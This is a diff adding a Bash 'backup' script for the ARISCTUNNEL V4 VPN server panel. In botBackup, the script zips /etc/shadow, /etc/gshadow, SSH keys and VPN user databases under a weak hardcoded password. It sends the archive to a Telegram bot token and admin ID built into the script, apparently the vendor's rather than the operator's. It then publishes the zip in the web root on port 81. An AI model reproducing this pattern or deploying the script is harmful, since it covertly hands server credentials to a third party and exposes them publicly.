@@ -1,0 +1,199 @@
+    #!/bin/bash
+    # COLOR VALIDATION
+    clear
+    RED='\033[0;31m'
+    NC='\033[0m'
+    gray="\e[1;30m"
+    Blue="\033[0;34m"
+    green='\033[0;32m'
+    grenbo="\e[92;1m"
+    YELL='\033[0;33m'
+    BG_BLU="\033[44;1m" # BG BIRU
+    # Getting
+    domain=$(cat /etc/xray/domain)
+    MYIP=$(cat /usr/bin/ipsave)
+    IP=$(wget -qO- icanhazip.com)
+    dateToday=$(date +"%Y-%m-%d")
+    Name=$(cat /usr/bin/user)
+    # . Liner 
+    function baris_panjang() {
+    echo -e "\033[5;36m ———————————————————————————————————————————————\033[0m"
+    }
+
+    function ARI_Banner() {
+    baris_panjang
+    NAMASC="ARISCTUNNEL V4"
+    function center_text() {
+        local text="$1"
+        local width=50  # Sesuaikan dengan panjang baris yang diinginkan
+
+        # Hapus kode warna untuk menghitung panjang sebenarnya dari teks
+        local plain_text=$(echo -e "$text" | sed 's/\x1b\[[0-9;]*m//g')
+        local len=${#plain_text}
+        local spaces=$(( (width - len) / 2 ))
+
+        # Tampilkan teks dengan warna dan centering yang benar
+        printf "%${spaces}s%s\033[0m\n" "" "$(echo -e "$text")"
+    }
+    # Kombinasi warna untuk ".::." dan "ARISCTUNNEL V4"
+    formatted_text="\e[36m.::.\033[0;35m $NAMASC \e[36m.::."
+    # Tampilkan teks yang diformat
+    center_text "$formatted_text"
+    baris_panjang
+    }
+
+    function Sc_Credit(){
+    sleep 1
+    baris_panjang
+    function center_text() {
+        local text="$1"
+        local width=50  # Sesuaikan dengan panjang baris yang diinginkan
+
+        # Hapus kode warna untuk menghitung panjang sebenarnya dari teks
+        local plain_text=$(echo -e "$text" | sed 's/\x1b\[[0-9;]*m//g')
+        local len=${#plain_text}
+        local spaces=$(( (width - len) / 2 ))
+
+        # Tampilkan teks dengan warna dan centering yang benar
+        printf "%${spaces}s%s\033[0m\n" "" "$(echo -e "$text")"
+    }
+    # Kombinasi warna untuk ".::." dan "ARISCTUNNEL V4"
+    formatted_text="\033[0;35m Terimakasih sudah menggunakan- \033[0m"
+    formatted_text1="\033[0;35m Script Credit By $NAMASC \033[0m"
+    # Tampilkan teks yang diformat
+    center_text "$formatted_text"
+    center_text "$formatted_text1"
+    baris_panjang
+    }
+    clear
+    function notif_backup() {
+    CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
+    KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
+    TIME="10"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+    TEXT="
+    <code>◇━━━━━━━━━━━━━━◇</code>
+    <b>  ⚠️ BACKUP NOTIF⚠️</b>
+    <b>     Detail Backup VPS</b>
+    <b>USERNAME : ${Name}</b>
+    <b>DOAMIN   : ${domain}</b>
+    <b>IP       : ${MYIP}</b>
+    <b>TODAY    : ${dateToday}</b>
+    <b>FILE     : https://${domain}:81/backup.zip</b>
+    <code>◇━━━━━━━━━━━━━━◇</code>
+    <code>Backup Vps Done</code>
+    <code>◇━━━━━━━━━━━━━━◇</code>
+    "'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://wa.me/ARI_VPN_STORE"},{"text":"Contact","url":"https://wa.me/6281327393959"}]]}'
+
+    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+    }
+    clear
+    botBackup() {
+        switch=on
+        bottoken=7113550046:AAHnAaNDdndh8R4fbfIELwDH6W1Dwcn4Lx8
+        adminid=1962241851
+        echo -e "[ ${green}INFO${NC} ] Create password "
+        if [[ -z $InputPass ]]; then
+        InputPass="Ari123Ok"
+        fi
+        echo -e "[ ${green}INFO${NC} ] • VPS Data Backup... "
+        echo -e "[ ${green}INFO${NC} ] • Directory Created... "
+        mkdir /root/backup &>/dev/null
+        echo -e "[ ${green}INFO${NC} ] • VPS Data Backup Start Now... "
+        echo -e "[ ${green}INFO${NC} ] • Please Wait , Backup In Process Now... "
+        cp /etc/passwd backup/ &>/dev/null
+        echo -e "[ ${green}INFO${NC} ] • Backup passwd data..."
+        cp /etc/group backup/ &>/dev/null
+        echo -e "[ ${green}INFO${NC} ] • Backup group data..."
+        cp /etc/shadow backup/ &>/dev/null
+        echo -e "[ ${green}INFO${NC} ] • Backup shadow data..."
+        cp /etc/gshadow backup/ &>/dev/null
+        echo -e "[ ${green}INFO${NC} ] • Backup gshadow data..."
+    cp /etc/crontab backup/ &>/dev/null
+    cp /etc/vmess/.vmess.db backup/ &>/dev/null
+    cp /etc/ssh/.ssh.db backup/ &>/dev/null
+    cp /etc/vless/.vless.db backup/ &>/dev/null
+    cp /etc/trojan/.trojan.db backup/ &>/dev/null
+    cp /etc/bot/.bot.db backup/ &>/dev/null
+    cp -r /etc/kyt/limit backup/ &>/dev/null
+    cp -r /etc/limit backup/qt/ &>/dev/null
+    cp -r /etc/ssh backup/ssh &>/dev/null
+    cp -r /var/lib/kyt/ backup/kyt  &>/dev/null
+    cp -r /etc/xray backup/xray &>/dev/null 
+    # Backup /var/www/html only if size <= 50MB (51200 KB)
+    www_dir="/var/www/html"
+    if [ -d "$www_dir" ]; then
+        size_kb=$(du -sk "$www_dir" 2>/dev/null | cut -f1)
+        if [ -z "$size_kb" ]; then
+            size_kb=0
+        fi
+        max_kb=51200
+        if [ "$size_kb" -le "$max_kb" ]; then
+            cp -r /var/www/html/ backup/html &>/dev/null
+            echo -e "[ ${green}INFO${NC} ] • Backup html directory (${size_kb} KB)"
+        else
+            echo -e "[ ${YELL}INFO${NC} ] • Skip backup html (size ${size_kb} KB > 51200 KB)"
+        fi
+    else
+        echo -e "[ ${YELL}INFO${NC} ] • Directory /var/www/html not found, skip html backup"
+    fi
+    cp -r /etc/banner.txt backup/banner.txt &>/dev/null
+    cp -r /etc/kyt/limit backup/limit &>/dev/null
+    cp -r /etc/vmess backup/vmess &>/dev/null
+    cp -r /etc/trojan backup/trojan &>/dev/null
+    cp -r /etc/vless backup/vless &>/dev/null
+    cp -r /etc/shadowsock backup/shadowsocks &>/dev/null
+    echo -e "[ ${green}INFO${NC} ] • Backup Bot data..."
+    cp -r /usr/bin/kyt/var.txt backup/var.txt &>/dev/null
+    cd /root &>/dev/null
+    zip -rP "$InputPass" "backup.zip" backup >/dev/null 2>&1
+
+        echo -e "[ ${green}INFO${NC} ] • Sending Via Bot... "
+        if [[ ! -f "/root/backup.zip" ]]; then
+            echo -e "[ ${RED}ERROR${NC} ] File /root/backup.zip tidak ditemukan. Backup tidak dikirim ke Telegram."
+            return
+        fi
+
+        caption=$'USERNAME : '$Name$'\nDOAMIN : '$domain$'\nIP : '$MYIP$'\nBACKUP TODAY : '$dateToday$'\nLINK FILE : https://'$domain$':81/backup.zip'
+
+        response=$(curl -Ss --request POST \
+            --url "https://api.telegram.org/bot${bottoken}/sendDocument" \
+            --form chat_id="${adminid}" \
+            --form document=@"/root/backup.zip" \
+            --form caption="$caption")
+        echo "$response" >/root/t1
+
+        if echo "$response" | grep -q '"ok":true'; then
+            echo -e "[ ${green}SUCCESS${NC} ] BERHASIL DI BACKUP KE BOT ADMIN"
+        else
+            echo -e "[ ${RED}ERROR${NC} ] GAGAL KIRIM KE TELEGRAM"
+            echo -e "[ ${YELL}INFO${NC} ] Response Telegram:"
+            echo "$response"
+        fi
+
+    # fileId=$(grep -o '"file_id":"[^"]*' /root/t1 | grep -o '[^"]*$')
+
+    #    curl -Ss --request GET \
+    #       --url "https://api.telegram.org/bot${bottoken}/getfile?file_id=${fileId}" >/root/t1
+
+    #   filePath=$(grep -o '"file_path":"[^"]'* /root/t1 | grep -o '[^"]*$')
+
+    #   curl -Ss --request GET \
+    #   --url "https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=${adminid}&text=USERNAME : $Name%0ADOAMIN : $domain%0AIP : $MYIP%0ABACKUP TODAY : $dateToday%0AFile ID   : <code>${fileId}</code>%0AFile Path : <code>${filePath}</code>&parse_mode=html" &>/dev/null
+
+        echo -e "[ ${green}INFO${NC} ] • Completed Backup... "
+    #  echo -e "${green}USERNAME  :${NC} ${Name}"
+    echo -e "${green}FILE    :${NC} https://${domain}:81/backup.zip"
+    #    echo -e "${green}IP        :${NC} ${MYIP}"
+    #    echo -e "${green}TODAY     :${NC} ${dateToday}"
+    #    echo -e "${green}File ID   :${NC} ${fileId}"
+    #    echo -e "${green}File Path :${NC} ${filePath}"
+        rm -rf /root/backup
+        mv /root/backup.zip /var/www/html/backup.zip
+        rm -f /root/t1
+    }
+        echo -e "${green}SETUP SUDAH DI SETTING OLEH ADMIN${NC}"
+        botBackup
+        notif_backup
+        read -n 1 -s -r -p " Press Enter for Back to Manage"
+    bash /usr/bin/m-bkp
